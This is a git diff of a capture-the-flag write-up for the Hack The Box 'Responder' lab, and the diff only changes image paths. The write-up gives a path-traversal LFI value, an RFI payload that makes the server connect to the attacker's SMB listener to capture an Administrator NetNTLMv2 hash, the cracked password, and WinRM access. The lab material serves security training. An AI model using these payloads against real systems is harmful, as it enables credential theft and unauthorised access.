@@ -1,13 +1,13 @@
 ## Box 4: Responder
 
- <img src="1.png" class="center">
+ <img src="img/1.png" class="center">
 
 This Box is tagged "SAMBA", "Enumeration", "Apache" and "WinRM". 
 
 ## Checking for open ports : 
 First we run  **nmap -p- -sV -O 10.129.232.67**
 
- <img src="2.png" class="center">
+ <img src="img/2.png" class="center">
  
  **Task1: How many TCP ports are open on the machine? :** 2 open ports 
  **- 80/tcp**
@@ -21,22 +21,22 @@ If WinRM is enabled on the machine, it's trivial to remotely administer the mach
 **Task2: When visiting the web service using the IP address, what is the domain that we are being redirected to?** unika.htb
 At this point, we need to setup a local DNS using the hosts file (/etc/hosts) 
 
-<img src="3.png" class="center"> 
+<img src="img/3.png" class="center"> 
 
 By entering the ip given we will get this page :
-<img src="14.png" class="center"> 
+<img src="img/14.png" class="center"> 
 
 
 **Task3: Which scripting language is being used on the server to generate webpages?** PHP
 By using the tool Wapppalyzer we can see that the scripting language used is PHP 
 
-<img src="4.png" class="center"> 
+<img src="img/4.png" class="center"> 
 
 **Task4: What is the name of the URL parameter which is used to load different language versions of the webpage?** page
 **Task5: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
 ../../../../../../../../windows/system32/drivers/etc/hosts
 
-<img src="5.png" class="center"> 
+<img src="img/5.png" class="center"> 
 
 **Task6: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"**
 //10.10.14.6/somefile
@@ -51,20 +51,20 @@ Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applic
 
 By using the responder which is an inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request.
 
-<img src="6.png" class="center"> 
-<img src="7.png" class="center"> 
+<img src="img/6.png" class="center"> 
+<img src="img/7.png" class="center"> 
 
 Now that the responder server is listening , we will make the server include a ressource from our smb using the following payload:
 **http://unika.htb/?page=//ourIP@/somefile**
 
 The responder server got a NetNTLMv for the Administrator user.
-<img src="8.png" class="center"> 
+<img src="img/8.png" class="center"> 
 We can copy this hash into a file that we will call hash . 
 
 **Task9 : There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?** John The Ripper 
 
 We can now crack the hash that we have got using the tool John the Ripper to get the password of the Administrator like the following : 
-<img src="9.png" class="center"> 
+<img src="img/9.png" class="center"> 
 
 **Task10: What is the password for the administrator user?** badminton
 
@@ -72,10 +72,10 @@ We can now crack the hash that we have got using the tool John the Ripper to get
 
 By using the tool evil winrm we can connect to the WinRM service on the target machine :
 
-<img src="10.png" class="center"> 
-<img src="11.png" class="center"> 
-<img src="12.png" class="center"> 
+<img src="img/10.png" class="center"> 
+<img src="img/11.png" class="center"> 
+<img src="img/12.png" class="center"> 
 We can find the flag under c:\Users\mike\Desktop
-<img src="13.png" class="center"> 
+<img src="img/13.png" class="center"> 
 
 
